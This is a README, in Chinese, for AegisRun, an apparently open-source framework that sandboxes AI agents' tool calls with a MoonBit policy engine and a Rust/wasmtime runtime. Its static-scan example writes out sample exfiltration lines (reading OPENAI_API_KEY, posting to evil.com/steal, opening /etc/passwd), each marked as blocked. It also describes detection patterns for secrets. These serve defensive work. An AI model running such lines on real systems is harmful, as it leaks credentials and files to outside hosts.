# AegisRun v0.9.2

**AI Agent 安全工具执行框架 — MoonBit 策略引擎 + Rust 沙箱运行时**

> 🇬🇧 [English README →](docs-en/README.md)

[![MoonBit](https://img.shields.io/badge/MoonBit-0.1.20260703-blue)](https://moonbitlang.com)
[![Rust](https://img.shields.io/badge/Rust-wasmtime%2046-orange)](https://github.com/tuya-me/AegisRun/tree/clean-v2/runtime)
[![License](https://img.shields.io/badge/License-Apache--2.0-blue)](https://opensource.org/licenses/Apache-2.0)
[![OSC2026](https://img.shields.io/badge/OSC2026-AI%20Agent%20Track-orange)](https://moonbitlang.github.io/OSC2026/)

> MoonBit `>= 0.1.20260703` | Rust `>= 1.80`（仅 runtime 目录需要）| wasmtime 46
> **安装：** `moon add tuya-me/aegisrun` &nbsp;|&nbsp; **分支：** `clean-v2`

---

## 项目简介

AegisRun 解决的是一个很具体的问题：当 AI Agent 调用外部工具时，怎么防止这些工具越权操作？比如一个 MCP 工具偷偷读取你的 `OPENAI_API_KEY` 环境变量、把 `.ssh/config` 上传到外部服务器、或者悄悄扫描你的内网端口——这些都是实际出现过的安全事件。

AegisRun 的做法是在 Agent 和系统之间插入一个安全检查层，分成两个独立的部分：

- **MoonBit 策略引擎**（`src/lib/`，约 3600 行）：负责所有"该不该放行"的判断。它维护了一套域名/IP 黑名单（45+ 条规则，支持后缀通配和前缀匹配），拦截对 `/etc/passwd`、`~/.ssh/` 等敏感路径的访问，过滤包含 `KEY`、`SECRET`、`TOKEN` 等模式的环境变量（60+ 条），还会根据工具行为做风险评分和限流熔断。这一层是纯逻辑，没有外部依赖，可以直接作为 MoonBit 库引入你的项目。

- **Rust 运行时**（`runtime/`，约 1800 行）：负责把策略落地到实际执行中。核心是用 wasmtime 构建的 WASI 沙箱——工具代码编译成 Wasm 后跑在沙箱里，所有系统调用（打开文件、读取环境变量、发起网络请求）都会被拦截，然后调用 MoonBit 层的策略函数来决定允许还是拒绝。除此之外，Rust 层还提供了一个 9090 端口的 Web 管理面板、JSONL 格式的审计日志、Python audit hook 运行时监控，以及工具签名验证机制。

## 两层架构

```
MoonBit 库 (src/lib/)               Rust 运行时 (runtime/)
┌────────────────────┐           ┌──────────────────────────────┐
│ check_domain()     │   Allow   │ wasmtime WASI 拦截器          │
│ check_path()       │←─────────│ path_open → check_path       │
│ check_env()        │   Deny    │ environ_get → check_env      │
│                    │           │ sock_send → check_domain    │
│ 纯逻辑，纯 MoonBit  │           │ 系统调用拦截，Rust 实现        │
└────────────────────┘           └──────────────────────────────┘
    策略判断层                         执行拦截层
```

### 五层防御

| 层 | 名称 | 实现 |
|:--:|------|------|
| 1 | 安装时声明审查 | 风险评分引擎 |
| 2 | 域名/IP 黑名单 | HashMap O(1) + 后缀通配 + IP 前缀（45+规则）|
| 3 | 路径 + 环境变量保护 | 精确 + 前缀 + KEY/SECRET/TOKEN 检测（60+模式）|
| 4 | 工具黑名单 + 审计 | 即时封杀 + JSONL 持久化 + 策略热加载 |
| 5 | Wasm 沙箱物理隔离 | Rust wasmtime WASI 零目录预打开 |

## 快速开始

```cmd
cd D:\moonbit\aegisrun
scripts\quickstart.cmd              # 一键菜单

moon run src/main                 # 策略引擎演示

cd runtime
cargo run -- demo                 # Rust 策略引擎演示
cargo run -- serve                # Web 面板（9090端口）
```

## 文档导视

| 如果你... | 请阅读 |
|-----------|--------|
| **新手** — 想立刻跑起来 | [docs-ch/GUIDE.md](docs-ch/GUIDE.md)（新手入门） |
| **开发者** — 集成库 | [docs-ch/GUIDE.md](docs-ch/GUIDE.md)（详情参考） |
| **贡献者** — 提代码 | [docs-ch/CONTRIBUTING.md](docs-ch/CONTRIBUTING.md) |
| **安全工程师** — 审计规则 | [docs-ch/SECURITY-POLICY.md](docs-ch/SECURITY-POLICY.md) |
| **架构探索** — 理解设计 | [docs-ch/ARCHITECTURE.md](docs-ch/ARCHITECTURE.md) |
| **版本追踪** — 看更新 | [docs-ch/CHANGELOG.md](docs-ch/CHANGELOG.md) |
| **English speakers** | [docs-en/README.md](docs-en/README.md) |

### 文档树

```
README.md                        ← 本文（项目概览）
docs-ch/                          ← 中文文档（主版本）
├── GUIDE.md                      使用指南（新手级 + 详情级）
├── ARCHITECTURE.md               架构 + 调用链
├── CONTRIBUTING.md               贡献指南
├── CHANGELOG.md                  更新日志
├── SECURITY-POLICY.md            安全策略
└── DOCUMENTATION-GUIDE.md        文档规范
docs-en/                          ← 英文文档（辅助版本）
└── ...                           对应上述所有文档
```

## 命令速查

| 命令 | 效果 |
|------|------|
| `moon run src/main` | MoonBit 策略引擎 + 演示 |
| `cargo run -- demo` | Rust 策略引擎演示 |
| `cargo run -- scan malware.py` | 扫描脚本找威胁 |
| `cargo run -- sandbox tool.wasm` | WASI 物理隔离沙箱 |
| `cargo run -- serve` | Web 面板（9090端口）|
| `cargo run -- sandbox-monitor` | 运行时沙箱监控 |
| `cargo run -- audit` | 审计日志 JSONL |
| `cargo run -- verify tool.wasm id pub` | 工具签名验证 |

### Web 管理面板

AegisRun 提供完整的 Web 管理面板，支持中英文界面切换、实时安全检测和 MCP Agent 交互调用。

```cmd
cd runtime && cargo run -- serve
```

浏览器打开 `http://localhost:9090` 即可访问。面板分为三大区域：

```
┌─────────────────────────────────────────────────────────────┐
│  Web 管理区                                                  │
│  ├─ 仪表盘: 防御层开关、实时统计、预设模板                    │
│  ├─ 域名策略: 黑名单/白名单管理                              │
│  ├─ 路径策略: 敏感路径拦截                                   │
│  ├─ 环境变量: 敏感变量模式                                   │
│  ├─ 工具管理: 工具ID封杀                                     │
│  └─ 审计日志: 实时操作记录                                   │
├─────────────────────────────────────────────────────────────┤
│  Sandbox 检测区                                              │
│  ├─ 静态扫描: 分析源码中的恶意模式                           │
│  └─ 运行时沙箱: Python audit hook 拦截实际操作               │
├─────────────────────────────────────────────────────────────┤
│  MCP Agent 区                                                │
│  ├─ MCP 端点配置说明                                         │
│  ├─ 可用工具列表（9个工具）                                  │
│  └─ 交互式调用面板: 选择工具 → 填写参数 → 查看结果          │
└─────────────────────────────────────────────────────────────┘
```

**防御层控制** — 五层防御实时状态，每层独立开关：

- **运行时沙箱** (Layer 1): Python audit hook 监控
- **域名黑名单** (Layer 2): 精确匹配 + 后缀通配 + IP前缀
- **路径+环境变量** (Layer 3): 精确匹配 + 前缀目录 + KEY/SECRET/TOKEN 检测
- **扫描器** (Layer 4): 静态代码分析
- **Wasm 沙箱** (Layer 5): wasmtime WASI 物理隔离

**安全检测** — Sandbox 标签页提供两种模式：

```python
# 静态扫描
import os
key = os.environ.get("OPENAI_API_KEY")  # L2 [env] OPENAI_API_KEY — BLOCKED
import requests
requests.post("https://evil.com/steal")  # L4 [host] evil.com — BLOCKED
open("/etc/passwd")                      # L5 [path] /etc/passwd — BLOCKED
```

**策略配置** — 三种方式：预设模板（Standard / Strict / Permissive）、手动管理、实时同步。

**API 接口：** `GET /api/policy` | `GET /api/stats` | `GET /api/audit` | `POST /api/scan` | `POST /api/sandbox-run` | `POST /mcp`

### 库调用

```moonbit
// MoonBit：moon add tuya-me/aegisrun
let aegis = @lib.AegisRun::new("standard")
aegis.check_domain("evil.com")          // → Deny
```

```rust
// Rust：cargo add aegisrun-runtime
let policy = Policy::standard();
policy.check_domain("evil.com");  // → false
```

### MCP 集成

```json
{ "mcpServers": { "aegisrun": { "url": "http://localhost:9090/mcp" } } }
```

9 个工具：policy.summary / policy.check_domain / policy.check_path / policy.check_env / guard_tool_call / scan_code / scan_file / sandbox_python / sandbox_wasm

## 开源许可

Apache License 2.0
